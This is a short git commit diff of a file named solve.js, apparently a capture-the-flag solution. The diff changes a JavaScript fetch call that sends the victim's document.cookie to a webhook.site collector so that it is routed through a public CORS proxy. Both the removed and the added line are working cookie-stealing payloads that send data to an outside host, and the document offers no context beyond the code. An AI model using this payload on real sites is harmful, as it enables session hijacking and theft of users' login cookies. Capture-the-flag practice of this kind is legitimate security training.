903b9addf90f3a637470900f9f11650032ffa990
Theory <51336409+7h30ry@users.noreply.github.com>
2025-05-03 13:51:41 +0100

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,4 +1,4 @@
-fetch('https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884/?data=' + encodeURIComponent(document.cookie), {
+fetch('https://robwu.nl/cors-anywhere.html/https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884/?data=' + encodeURIComponent(document.cookie), {
   method: 'GET',
   mode: 'cors',
   headers: {
